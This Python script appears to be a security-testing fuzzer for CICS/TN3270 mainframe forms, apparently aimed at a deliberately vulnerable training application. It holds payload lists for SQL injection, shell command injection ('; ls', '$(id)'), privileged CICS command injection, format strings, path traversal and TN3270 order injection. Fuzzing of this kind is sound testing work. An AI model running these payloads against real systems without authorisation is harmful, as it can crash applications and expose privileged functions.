#!/usr/bin/env python3
"""
fuzz.py - Comprehensive CICS/Mainframe Form Fuzzer

Fuzzes ALL input fields with CICS/COBOL-specific payloads:
- Buffer overflow testing
- Packed decimal (COMP-3) invalid data
- Zoned decimal attacks
- EBCDIC control character injection
- Date/time edge cases
- CICS transaction/command injection
- SQL/DB2 injection attempts
- LOW-VALUES / HIGH-VALUES
- TN3270 order/attribute injection
- Random binary data

Monitors for ABEND conditions and stops on detection.
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'hack3270_libs'))

import time
import random
from hack3270_api import Hack3270API

# Configuration
API_HOST = '127.0.0.1'
API_PORT = 31337
DELAY = 0.3

# Extended abend patterns (API has basic ones, these are additional)
EXTENDED_ABEND_PATTERNS = [
    'ABND',
    'AEY9', 'AEIO', 'AEIN', 'AEIS', 'AFCA', 'AKCT',
    'SOC1', 'S0C1',
    'TRANSACTION DUMP', 'PROGRAM CHECK', 'PROTECTION EXCEPTION',
    'OPERATION EXCEPTION', 'ADDRESSING EXCEPTION', 'DATA EXCEPTION',
    'SPECIFICATION EXCEPTION', 'DECIMAL OVERFLOW', 'DIVIDE EXCEPTION',
    'INVALID OPERATION', 'STORAGE VIOLATION', 'CICS ABEND',
]

# TN3270 constants
AID_ENTER = 0x7D
SBA = 0x11
SF = 0x1D
SFE = 0x29
SA = 0x28
MF = 0x2C
IC = 0x13
PT = 0x05
RA = 0x3C
EUA = 0x12
GE = 0x08
IAC_EOR = bytes([0xFF, 0xEF])

# Form field addresses (from dvca-brute.db ID 41)
# Each entry: (address, name, default_value, max_length)
CURSOR_ADDR = bytes([0xC6, 0xE7])
FORM_FIELDS = [
    (bytes([0xC6, 0xE7]), 'Name', 'Phillip Young', 44),
    (bytes([0xC9, 0xC7]), 'Address', '101 Adelaide St W', 44),
    (bytes([0x4B, 0xE7]), 'City', 'Toronto', 44),
    (bytes([0x4E, 0xC7]), 'State', 'Ontario', 44),
    (bytes([0x50, 0xE7]), 'Zip', 'M5H 0B3', 44),
    (bytes([0xD3, 0xC7]), 'Country', 'Canada', 44),
    (bytes([0xD5, 0xE7]), 'Code', '1234', 4),
]


# =============================================================================
# PAYLOAD GENERATORS
# =============================================================================

def generate_overflow_payloads(field_length):
    """Generate oversized payloads to test buffer handling."""
    payloads = []
    
    # Sizes relative to field length and absolute sizes
    sizes = [
        field_length + 1,
        field_length + 4,
        field_length * 2,
        field_length * 4,
        50, 64, 100, 128, 256, 500, 1000
    ]
    sizes = sorted(set(s for s in sizes if s > field_length))[:8]
    
    for length in sizes:
        payloads.append(('A' * length, f"OVF-{length}", False))
    
    # Numeric overflow
    payloads.append(('9' * (field_length * 2), f"NUM-OVF-{field_length*2}", False))
    
    return payloads


def generate_packed_decimal_payloads():
    """
    Generate invalid COMP-3 (packed decimal) payloads.
    Packed decimal uses 4 bits per digit, last nibble is sign.
    Valid signs: C (positive), D (negative), F (unsigned positive)
    """
    payloads = []
    
    # Invalid sign nibbles (should be C, D, or F)
    payloads.append((bytes([0x12, 0x34, 0x5A]), "COMP3-SIGN-A", True))
    payloads.append((bytes([0x12, 0x34, 0x5B]), "COMP3-SIGN-B", True))
    payloads.append((bytes([0x12, 0x34, 0x5E]), "COMP3-SIGN-E", True))
    payloads.append((bytes([0x12, 0x34, 0x50]), "COMP3-SIGN-0", True))
    payloads.append((bytes([0x12, 0x34, 0x51]), "COMP3-SIGN-1", True))
    
    # Invalid digit nibbles (A-F in digit positions, should be 0-9)
    payloads.append((bytes([0xAB, 0xCD, 0xEF]), "COMP3-HEX-DIGITS", True))
    payloads.append((bytes([0xFA, 0xBC, 0xDC]), "COMP3-HEX-MIX", True))
    
    # Maximum value overflow attempts
    payloads.append((bytes([0x99, 0x99, 0x99, 0x99, 0x9C]), "COMP3-MAX-POS", True))
    payloads.append((bytes([0x99, 0x99, 0x99, 0x99, 0x9D]), "COMP3-MAX-NEG", True))
    
    # All same nibble patterns
    payloads.append((bytes([0xFF, 0xFF, 0xFF, 0xFF]), "COMP3-ALL-F", True))
    payloads.append((bytes([0x00, 0x00, 0x00, 0x00]), "COMP3-ALL-0", True))
    payloads.append((bytes([0xAA, 0xAA, 0xAA, 0xAA]), "COMP3-ALL-A", True))
    
    # Odd-length packed (should have even number of nibbles for digits + sign)
    payloads.append((bytes([0x1C]), "COMP3-1BYTE", True))
    payloads.append((bytes([0x12, 0x3C]), "COMP3-2BYTE", True))
    
    # Zero with various signs
    payloads.append((bytes([0x00, 0x0C]), "COMP3-ZERO-POS", True))
    payloads.append((bytes([0x00, 0x0D]), "COMP3-ZERO-NEG", True))
    payloads.append((bytes([0x00, 0x0F]), "COMP3-ZERO-UNS", True))
    
    return payloads


def generate_zoned_decimal_payloads():
    """
    Generate invalid zoned decimal payloads.
    EBCDIC zoned: F0-F9 for digits 0-9 (zone nibble F, digit nibble 0-9)
    """
    payloads = []
    
    # Invalid zone nibbles (should be F for unsigned)
    payloads.append((bytes([0x00, 0x01, 0x02, 0x03]), "ZONED-NULL-ZONE", True))
    payloads.append((bytes([0xA0, 0xA1, 0xA2, 0xA3]), "ZONED-A-ZONE", True))
    payloads.append((bytes([0xE0, 0xE1, 0xE2, 0xE3]), "ZONED-E-ZONE", True))
    
    # ASCII digits instead of EBCDIC (0x30-0x39 vs 0xF0-0xF9)
    payloads.append((bytes([0x30, 0x31, 0x32, 0x33]), "ZONED-ASCII", True))
    payloads.append((bytes([0x39, 0x38, 0x37, 0x36]), "ZONED-ASCII-REV", True))
    
    # EBCDIC letters where digits expected
    payloads.append((bytes([0xC1, 0xC2, 0xC3, 0xC4]), "ZONED-ALPHA-ABCD", True))
    payloads.append((bytes([0xD1, 0xD2, 0xD3, 0xD4]), "ZONED-ALPHA-JKLM", True))
    
    # Mixed valid/invalid zones
    payloads.append((bytes([0xF1, 0x02, 0xF3, 0x04]), "ZONED-MIX-ZONE", True))
    
    # Signed zoned (last byte has C/D zone for sign)
    payloads.append((bytes([0xF1, 0xF2, 0xF3, 0xC4]), "ZONED-SIGN-C", True))
    payloads.append((bytes([0xF1, 0xF2, 0xF3, 0xD4]), "ZONED-SIGN-D", True))
    payloads.append((bytes([0xF1, 0xF2, 0xF3, 0xA4]), "ZONED-SIGN-A", True))
    
    return payloads


def generate_date_payloads():
    """Generate invalid date/time payloads."""
    payloads = []
    
    # Invalid dates (YYYYMMDD format)
    invalid_dates = [
        ('00000000', 'DATE-NULL'),
        ('99999999', 'DATE-MAX'),
        ('20250230', 'DATE-FEB30'),
        ('20250231', 'DATE-FEB31'),
        ('20230229', 'DATE-FEB29-NOLEAP'),  # 2023 not leap year
        ('20251301', 'DATE-MONTH13'),
        ('20251401', 'DATE-MONTH14'),
        ('20250001', 'DATE-MONTH00'),
        ('20250100', 'DATE-DAY00'),
        ('20250132', 'DATE-DAY32'),
        ('20250199', 'DATE-DAY99'),
        ('20250431', 'DATE-APR31'),
        ('20250631', 'DATE-JUN31'),
        ('20250931', 'DATE-SEP31'),
        ('20251131', 'DATE-NOV31'),
        ('00010101', 'DATE-YEAR1'),
        ('99991231', 'DATE-YEAR9999'),
        ('19000229', 'DATE-1900-FEB29'),  # 1900 not leap year
        ('20000229', 'DATE-2000-FEB29'),  # 2000 is leap year (valid)
    ]
    
    for date_str, name in invalid_dates:
        payloads.append((date_str, name, False))
    
    # Invalid times (HHMMSS format)
    invalid_times = [
        ('250000', 'TIME-HOUR25'),
        ('996000', 'TIME-HOUR99'),
        ('126000', 'TIME-MIN60'),
        ('129900', 'TIME-MIN99'),
        ('120060', 'TIME-SEC60'),
        ('120099', 'TIME-SEC99'),
        ('999999', 'TIME-MAX'),
        ('000000', 'TIME-ZERO'),
    ]
    
    for time_str, name in invalid_times:
        payloads.append((time_str, name, False))
    
    # Julian dates (YYYYDDD)
    julian_dates = [
        ('2025000', 'JULIAN-DAY0'),
        ('2025366', 'JULIAN-DAY366-NOLEAP'),
        ('2025367', 'JULIAN-DAY367'),
        ('2025999', 'JULIAN-DAY999'),
    ]
    
    for julian, name in julian_dates:
        payloads.append((julian, name, False))
    
    return payloads


def generate_ebcdic_control_payloads():
    """Generate EBCDIC control character injection payloads."""
    payloads = []
    
    # EBCDIC control characters
    controls = [
        (0x00, 'NUL'),      # Null
        (0x01, 'SOH'),      # Start of Heading
        (0x02, 'STX'),      # Start of Text
        (0x03, 'ETX'),      # End of Text
        (0x04, 'SEL'),      # Select
        (0x05, 'HT'),       # Horizontal Tab
        (0x06, 'RNL'),      # Required New Line
        (0x07, 'DEL'),      # Delete
        (0x0D, 'CR'),       # Carriage Return
        (0x0E, 'SO'),       # Shift Out (DBCS)
        (0x0F, 'SI'),       # Shift In (DBCS)
        (0x10, 'DLE'),      # Data Link Escape
        (0x15, 'NL'),       # New Line (EBCDIC specific)
        (0x16, 'BS'),       # Backspace
        (0x19, 'EM'),       # End of Medium
        (0x1C, 'IFS'),      # Interchange File Separator
        (0x1D, 'IGS'),      # Interchange Group Separator
        (0x1E, 'IRS'),      # Interchange Record Separator
        (0x1F, 'IUS'),      # Interchange Unit Separator
        (0x25, 'LF'),       # Line Feed
        (0x26, 'ETB'),      # End of Transmission Block
        (0x27, 'ESC'),      # Escape
        (0x2F, 'BEL'),      # Bell
        (0x32, 'SYN'),      # Synchronous Idle
        (0x37, 'EOT'),      # End of Transmission
        (0x3F, 'SUB'),      # Substitute (often used for invalid chars)
    ]
    
    for code, name in controls:
        # Single control character repeated
        payloads.append((bytes([code] * 4), f"CTRL-{name}", True))
    
    # DBCS shift sequences
    payloads.append((bytes([0x0E, 0x0F, 0x0E, 0x0F]), "SHIFT-IO", True))
    payloads.append((bytes([0x0E, 0x42, 0x42, 0x0F]), "SHIFT-DBCS", True))
    payloads.append((bytes([0x0E] * 8), "SHIFT-OUT-FLOOD", True))
    payloads.append((bytes([0x0F] * 8), "SHIFT-IN-FLOOD", True))
    
    # Mixed control sequences
    payloads.append((bytes([0x0D, 0x25, 0x0D, 0x25]), "CRLF-EBCDIC", True))
    payloads.append((bytes([0x15, 0x15, 0x15, 0x15]), "NL-FLOOD", True))
    payloads.append((bytes([0x3F, 0x3F, 0x3F, 0x3F]), "SUB-FLOOD", True))
    
    return payloads


def generate_cics_injection_payloads():
    """Generate CICS transaction/command injection payloads."""
    payloads = []
    
    # Privileged CICS transactions (4 chars)
    cics_trans = [
        ('CEMT', 'CICS-MASTER-TERM'),      # Master terminal
        ('CEDA', 'CICS-RESOURCE-DEF'),     # Resource definition
        ('CEDF', 'CICS-DEBUG'),            # Debugging
        ('CESF', 'CICS-SIGNOFF'),          # Sign-off
        ('CECI', 'CICS-CMD-INTERP'),       # Command interpreter
        ('CEOT', 'CICS-TERMINAL'),         # Terminal status
        ('CEST', 'CICS-STORAGE'),          # Storage display
        ('CETR', 'CICS-TRACE'),            # Trace control
        ('CMAC', 'CICS-MACRO'),            # Macro
        ('CSPG', 'CICS-SECURITY'),         # Security
        ('CWBA', 'CICS-WORKBENCH'),        # Workbench
        ('CRTE', 'CICS-ROUTE'),            # Routing
        ('CSSF', 'CICS-SIGNON'),           # Sign-on facility
        ('CSFE', 'CICS-TERMINAL-FE'),      # Frontend
    ]
    
    for trans, name in cics_trans:
        payloads.append((trans, name, False))
    
    # Command injection attempts
    commands = [
        ('CEMT SET PROG(*) NEW', 'CICS-CMD-NEWCOPY'),
        ('CEDA DEF PROG(X) G(Y)', 'CICS-CMD-DEFPROG'),
        ('CEDF ON', 'CICS-CMD-DEBUG-ON'),
        ('CESF LOGOFF', 'CICS-CMD-LOGOFF'),
        ('CEMT I TASK', 'CICS-CMD-TASKS'),
        ('CEMT I PROG', 'CICS-CMD-PROGS'),
        ('CEMT I FILE', 'CICS-CMD-FILES'),
        ('CEMT I TRAN', 'CICS-CMD-TRANS'),
        ('CEMT SET FILE(*) OPE', 'CICS-CMD-OPEN-ALL'),
        ('CEMT SET FILE(*) CLO', 'CICS-CMD-CLOSE-ALL'),
    ]
    
    for cmd, name in commands:
        payloads.append((cmd, name, False))
    
    # Overflow transaction IDs
    payloads.append(('CEMT' * 10, 'CICS-TRANS-OVF', False))
    payloads.append(('AAAA' * 10, 'CICS-TRANS-OVF2', False))
    
    return payloads


def generate_sql_injection_payloads():
    """Generate SQL/DB2 injection payloads."""
    payloads = []
    
    sql_injections = [
        ("'", 'SQL-QUOTE'),
        ("''", 'SQL-QUOTE2'),
        ("' OR '1'='1", 'SQL-OR-TRUE'),
        ("' OR '1'='1' --", 'SQL-OR-COMMENT'),
        ("'; --", 'SQL-SEMICOLON'),
        ("' UNION SELECT", 'SQL-UNION'),
        ("1; DROP TABLE", 'SQL-DROP'),
        ("1' AND '1'='1", 'SQL-AND'),
        ("admin'--", 'SQL-ADMIN'),
        ("%27", 'SQL-URL-QUOTE'),
        ("' OR 1=1--", 'SQL-OR-NUM'),
        ("') OR ('1'='1", 'SQL-PAREN'),
        ("' HAVING 1=1--", 'SQL-HAVING'),
        ("' ORDER BY 1--", 'SQL-ORDER'),
        ("' GROUP BY 1--", 'SQL-GROUP'),
        ("X'; EXEC ", 'SQL-EXEC'),
        ("-1 OR 1=1", 'SQL-NEG-OR'),
        ("1 AND 1=2", 'SQL-FALSE'),
    ]
    
    for sql, name in sql_injections:
        payloads.append((sql, name, False))
    
    return payloads


def generate_cobol_special_payloads():
    """Generate COBOL special value payloads (LOW-VALUES, HIGH-VALUES, SPACES)."""
    payloads = []
    
    # LOW-VALUES (all nulls)
    for size in [4, 8, 16, 44]:
        payloads.append((bytes([0x00] * size), f"LOW-VALUES-{size}", True))
    
    # HIGH-VALUES (all 0xFF)
    for size in [4, 8, 16, 44]:
        payloads.append((bytes([0xFF] * size), f"HIGH-VALUES-{size}", True))
    
    # SPACES (EBCDIC 0x40)
    for size in [4, 8, 16, 44]:
        payloads.append((bytes([0x40] * size), f"SPACES-{size}", True))
    
    # ZEROS (EBCDIC 0xF0)
    for size in [4, 8, 16]:
        payloads.append((bytes([0xF0] * size), f"ZEROS-{size}", True))
    
    # Mixed patterns
    payloads.append((bytes([0x00, 0xFF] * 8), "LOW-HIGH-ALT", True))
    payloads.append((bytes([0x40, 0x00] * 8), "SPACE-NULL-ALT", True))
    payloads.append((bytes([0xFF, 0x00, 0x40] * 5), "HIGH-LOW-SPACE", True))
    
    return payloads


def generate_tn3270_order_payloads():
    """Generate TN3270 data stream order injection payloads."""
    payloads = []
    
    # 3270 Orders that might confuse the parser
    orders = [
        (0x11, 'SBA'),       # Set Buffer Address
        (0x1D, 'SF'),        # Start Field
        (0x29, 'SFE'),       # Start Field Extended
        (0x28, 'SA'),        # Set Attribute
        (0x2C, 'MF'),        # Modify Field
        (0x13, 'IC'),        # Insert Cursor
        (0x05, 'PT'),        # Program Tab
        (0x3C, 'RA'),        # Repeat to Address
        (0x12, 'EUA'),       # Erase Unprotected to Address
        (0x08, 'GE'),        # Graphic Escape
    ]
    
    for order_byte, name in orders:
        # Repeated order bytes
        payloads.append((bytes([order_byte] * 4), f"ORD-{name}-x4", True))
        payloads.append((bytes([order_byte] * 16), f"ORD-{name}-x16", True))
    
    # Order + fake address sequences
    payloads.append((bytes([0x11, 0x40, 0x40, 0x11, 0x40, 0x40]), "SBA-SEQ", True))
    payloads.append((bytes([0x1D, 0x60, 0x1D, 0x60]), "SF-SEQ", True))
    
    # Field attribute bytes
    attrs = [
        0x00,  # Unprotected, normal
        0x20,  # Protected
        0x28,  # Protected, skip
        0x2C,  # Protected, numeric
        0x0C,  # Unprotected, numeric
        0x30,  # Autoskip
        0x3C,  # Autoskip, MDT
    ]
    for attr in attrs:
        payloads.append((bytes([0x1D, attr] * 4), f"SF-ATTR-{attr:02X}", True))
    
    # Extended attributes
    payloads.append((bytes([0x29, 0x02, 0xC0, 0x00]), "SFE-EXT-ATTR", True))
    payloads.append((bytes([0x29, 0x03, 0x41, 0xF1, 0x42, 0xF4]), "SFE-COLOR", True))
    
    # Telnet IAC sequences embedded
    payloads.append((bytes([0xFF, 0xEF]), "IAC-EOR", True))
    payloads.append((bytes([0xFF, 0xF0]), "IAC-SE", True))
    payloads.append((bytes([0xFF, 0xFB, 0x00]), "IAC-WILL", True))
    payloads.append((bytes([0xFF, 0xFC, 0x00]), "IAC-WONT", True))
    payloads.append((bytes([0xFF, 0xFD, 0x00]), "IAC-DO", True))
    payloads.append((bytes([0xFF, 0xFE, 0x00]), "IAC-DONT", True))
    payloads.append((bytes([0xFF, 0xFF, 0xFF, 0xFF]), "IAC-FLOOD", True))
    
    return payloads


def generate_boundary_payloads(field_length):
    """Generate field boundary test payloads."""
    payloads = []
    
    # Exact boundaries
    if field_length > 1:
        payloads.append(('X' * (field_length - 1), f"BOUND-1LESS", False))
    payloads.append(('X' * field_length, f"BOUND-EXACT", False))
    payloads.append(('X' * (field_length + 1), f"BOUND-1MORE", False))
    
    # Single character tests
    payloads.append(('X', "BOUND-1CHAR", False))
    payloads.append(('', "BOUND-EMPTY", False))
    
    # Repeated boundary patterns
    payloads.append((('AB' * field_length)[:field_length + 5], "BOUND-PATTERN", False))
    
    return payloads


def generate_special_string_payloads():
    """Generate special string payloads that may cause issues."""
    payloads = []
    
    strings = [
        # Format string attacks
        ('%s%s%s%s', 'FMT-STRING-S'),
        ('%n%n%n%n', 'FMT-STRING-N'),
        ('%x%x%x%x', 'FMT-STRING-X'),
        ('%d%d%d%d', 'FMT-STRING-D'),
        ('%.9999999s', 'FMT-PRECISION'),
        
        # Path traversal
        ('../../../', 'PATH-TRAVERSE'),
        ('..\\..\\..\\', 'PATH-TRAVERSE-WIN'),
        
        # Command injection
        ('; ls', 'CMD-SEMICOLON'),
        ('| cat', 'CMD-PIPE'),
        ('`id`', 'CMD-BACKTICK'),
        ('$(id)', 'CMD-SUBSHELL'),
        
        # XML/markup
        ('<script>', 'XML-SCRIPT'),
        ('<!--', 'XML-COMMENT'),
        ('<!ENTITY', 'XML-ENTITY'),
        
        # Terminal escapes
        ('\x1b[2J', 'TERM-CLEAR'),
        ('\x1b[H', 'TERM-HOME'),
        
        # Repetition
        ('A' * 100, 'REPEAT-A100'),
        ('9' * 100, 'REPEAT-9100'),
        (' ' * 100, 'REPEAT-SPACE'),
    ]
    
    for string, name in strings:
        payloads.append((string, name, False))
    
    return payloads


def generate_binary_payloads():
    """Generate random binary payloads."""
    payloads = []
    
    # Random binary patterns
    for i in range(5):
        random_bytes = bytes([random.randint(0, 255) for _ in range(8)])
        payloads.append((random_bytes, f"RAND-BIN-{i+1}", True))
    
    # Alternating patterns
    payloads.append((bytes([0xAA, 0x55] * 4), "ALT-AA55", True))
    payloads.append((bytes([0x55, 0xAA] * 4), "ALT-55AA", True))
    payloads.append((bytes([0x0F, 0xF0] * 4), "ALT-0FF0", True))
    
    # Bit patterns
    payloads.append((bytes([0x80, 0x40, 0x20, 0x10, 0x08, 0x04, 0x02, 0x01]), "BIT-WALK", True))
    payloads.append((bytes([0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80]), "BIT-WALK-REV", True))
    
    return payloads


# =============================================================================
# PACKET BUILDING AND TESTING
# =============================================================================

def build_fuzz_packet(api, fuzz_field_idx, fuzz_data, is_binary):
    """
    Build a full TN3270 form submission packet with one field fuzzed.
    Handles TN3270E mode automatically.
    """
    # Start with TN3270E header if needed
    if api.is_tn3270e():
        packet = bytes([0x00, 0x00, 0x00, 0x00, 0x01, AID_ENTER]) + CURSOR_ADDR
    else:
        packet = bytes([AID_ENTER]) + CURSOR_ADDR
    
    for idx, (field_addr, name, default_val, max_len) in enumerate(FORM_FIELDS):
        if idx == fuzz_field_idx:
            if is_binary:
                field_data = fuzz_data
            else:
                field_data = api.ascii_to_ebcdic(fuzz_data)
        else:
            padded = default_val.ljust(max_len)[:max_len]
            field_data = api.ascii_to_ebcdic(padded)
        
        packet += bytes([SBA]) + field_addr + field_data
    
    packet += IAC_EOR
    return packet


def check_for_abend(api, response):
    """Check if response contains abend indicators."""
    # First check API's built-in patterns
    abend = api.check_abend(response)
    if abend:
        return abend
    
    # Check extended patterns
    response_upper = response.upper()
    for pattern in EXTENDED_ABEND_PATTERNS:
        if pattern in response_upper:
            return pattern
    return None


def run_payload_phase(api, phase_name, field_idx, field_name, payloads, tested, total):
    """Run a set of payloads against a field."""
    abend_found = None
    crash_found = None
    last_successful_payload = None
    
    for payload, name, is_binary in payloads:
        tested += 1
        
        if is_binary:
            display = payload.hex()[:20]
        elif len(payload) > 20:
            display = f"{payload[:20]}..."
        else:
            display = payload if payload else "(empty)"
        
        print(f"[{tested}/{total}] {field_name}/{name}: {display}", end=" ", flush=True)
        
        try:
            packet = build_fuzz_packet(api, field_idx, payload, is_binary)
            desc = f'Fuzz: {field_name}/{name}'
            api.send_raw(packet, desc)
            time.sleep(DELAY)
            
            response = api.get_last_server()
            abend = check_for_abend(api, response)
            
            if abend:
                print(f"*** ABEND: {abend} ***")
                abend_found = (field_name, name, abend, payload, is_binary)
                break
            else:
                print("OK")
                last_successful_payload = (field_name, name, payload, is_binary)
                
        except (ConnectionError, ConnectionResetError, ConnectionAbortedError, 
                BrokenPipeError, OSError) as e:
            print(f"*** CONNECTION LOST: {e} ***")
            # The crash likely happened on THIS payload or the previous one
            crash_found = (field_name, name, str(e), payload, is_binary, last_successful_payload)
            break
        except Exception as e:
            print(f"ERROR: {e}")
            # Check if this is a connection-related error
            if "10053" in str(e) or "10054" in str(e) or "connection" in str(e).lower():
                crash_found = (field_name, name, str(e), payload, is_binary, last_successful_payload)
                break
    
    return tested, abend_found, crash_found


def main():
    api = Hack3270API(host=API_HOST, port=API_PORT)
    
    print("=" * 75)
    print("CICS/MAINFRAME COMPREHENSIVE FORM FUZZER")
    print("=" * 75)
    print()
    print("Payload categories:")
    print("  - Buffer Overflow          - Packed Decimal (COMP-3)")
    print("  - Zoned Decimal            - Date/Time Edge Cases")
    print("  - EBCDIC Control Chars     - CICS Command Injection")
    print("  - SQL/DB2 Injection        - COBOL Special Values")
    print("  - TN3270 Order Injection   - Field Boundaries")
    print("  - Special Strings          - Random Binary")
    print()
    print("WARNING: This may crash the application!")
    print()
    
    api.connect()
    print("Connected!\n")
    
    # Generate all payload sets
    packed_payloads = generate_packed_decimal_payloads()
    zoned_payloads = generate_zoned_decimal_payloads()
    date_payloads = generate_date_payloads()
    ebcdic_ctrl_payloads = generate_ebcdic_control_payloads()
    cics_payloads = generate_cics_injection_payloads()
    sql_payloads = generate_sql_injection_payloads()
    cobol_payloads = generate_cobol_special_payloads()
    tn3270_payloads = generate_tn3270_order_payloads()
    special_payloads = generate_special_string_payloads()
    binary_payloads = generate_binary_payloads()
    
    # Count totals
    fixed_payloads = (
        len(packed_payloads) + len(zoned_payloads) + len(date_payloads) +
        len(ebcdic_ctrl_payloads) + len(cics_payloads) + len(sql_payloads) +
        len(cobol_payloads) + len(tn3270_payloads) + len(special_payloads) +
        len(binary_payloads)
    )
    
    total_overflow = sum(len(generate_overflow_payloads(f[3])) for f in FORM_FIELDS)
    total_boundary = sum(len(generate_boundary_payloads(f[3])) for f in FORM_FIELDS)
    
    total = (fixed_payloads * len(FORM_FIELDS)) + total_overflow + total_boundary
    
    print(f"Form fields to fuzz: {len(FORM_FIELDS)}")
    for _, name, _, max_len in FORM_FIELDS:
        print(f"  - {name} (max {max_len} chars)")
    print()
    print(f"Total payloads: {total}")
    print(f"  Overflow:        ~{total_overflow}")
    print(f"  Boundary:        ~{total_boundary}")
    print(f"  Packed Decimal:  {len(packed_payloads)} x {len(FORM_FIELDS)} fields")
    print(f"  Zoned Decimal:   {len(zoned_payloads)} x {len(FORM_FIELDS)} fields")
    print(f"  Date/Time:       {len(date_payloads)} x {len(FORM_FIELDS)} fields")
    print(f"  EBCDIC Control:  {len(ebcdic_ctrl_payloads)} x {len(FORM_FIELDS)} fields")
    print(f"  CICS Injection:  {len(cics_payloads)} x {len(FORM_FIELDS)} fields")
    print(f"  SQL Injection:   {len(sql_payloads)} x {len(FORM_FIELDS)} fields")
    print(f"  COBOL Special:   {len(cobol_payloads)} x {len(FORM_FIELDS)} fields")
    print(f"  TN3270 Orders:   {len(tn3270_payloads)} x {len(FORM_FIELDS)} fields")
    print(f"  Special Strings: {len(special_payloads)} x {len(FORM_FIELDS)} fields")
    print(f"  Random Binary:   {len(binary_payloads)} x {len(FORM_FIELDS)} fields")
    print()
    
    abend_found = None
    crash_found = None
    tested = 0
    
    phases = [
        ("PHASE 1: Buffer Overflow", lambda fl: generate_overflow_payloads(fl)),
        ("PHASE 2: Field Boundaries", lambda fl: generate_boundary_payloads(fl)),
        ("PHASE 3: Packed Decimal (COMP-3)", lambda fl: packed_payloads),
        ("PHASE 4: Zoned Decimal", lambda fl: zoned_payloads),
        ("PHASE 5: Date/Time Edge Cases", lambda fl: date_payloads),
        ("PHASE 6: EBCDIC Control Characters", lambda fl: ebcdic_ctrl_payloads),
        ("PHASE 7: CICS Command Injection", lambda fl: cics_payloads),
        ("PHASE 8: SQL/DB2 Injection", lambda fl: sql_payloads),
        ("PHASE 9: COBOL Special Values", lambda fl: cobol_payloads),
        ("PHASE 10: TN3270 Order Injection", lambda fl: tn3270_payloads),
        ("PHASE 11: Special Strings", lambda fl: special_payloads),
        ("PHASE 12: Random Binary", lambda fl: binary_payloads),
    ]
    
    try:
        for phase_name, payload_gen in phases:
            print()
            print("=" * 75)
            print(phase_name)
            print("=" * 75)
            
            for field_idx, (_, field_name, _, max_len) in enumerate(FORM_FIELDS):
                print(f"\n--- Field: {field_name} ---")
                
                payloads = payload_gen(max_len)
                tested, abend_found, crash_found = run_payload_phase(
                    api, phase_name, field_idx, field_name, 
                    payloads, tested, total
                )
                
                if abend_found or crash_found:
                    raise StopIteration()
    
    except StopIteration:
        pass
    
    except KeyboardInterrupt:
        print("\n\nInterrupted by user!")
    
    finally:
        print()
        print("=" * 75)
        print("FUZZING COMPLETE")
        print("=" * 75)
        print(f"Payloads tested: {tested}/{total}")
        
        if crash_found:
            field_name, payload_name, error, payload, is_binary, last_good = crash_found
            print()
            print("!!! CONNECTION CRASH DETECTED !!!")
            print(f"  Field: {field_name}")
            print(f"  Payload that caused crash: {payload_name}")
            print(f"  Error: {error}")
            if is_binary:
                print(f"  Data (hex): {payload.hex()}")
            else:
                display = payload[:100] + ('...' if len(payload) > 100 else '')
                print(f"  Data: {display}")
            if last_good:
                lg_field, lg_name, lg_payload, lg_binary = last_good
                print()
                print("  Last successful payload before crash:")
                print(f"    Field: {lg_field}")
                print(f"    Payload: {lg_name}")
                if lg_binary:
                    print(f"    Data (hex): {lg_payload.hex()}")
                else:
                    lg_display = lg_payload[:50] + ('...' if len(lg_payload) > 50 else '')
                    print(f"    Data: {lg_display}")
        elif abend_found:
            field_name, payload_name, abend, payload, is_binary = abend_found
            print()
            print("!!! ABEND DETECTED !!!")
            print(f"  Field: {field_name}")
            print(f"  Payload: {payload_name}")
            print(f"  Abend code: {abend}")
            if is_binary:
                print(f"  Data (hex): {payload.hex()}")
            else:
                display = payload[:100] + ('...' if len(payload) > 100 else '')
                print(f"  Data: {display}")
        else:
            print("No abends or crashes detected.")
        
        try:
            api.disconnect()
        except:
            pass
        print("\nDisconnected.")


if __name__ == '__main__':
    main()
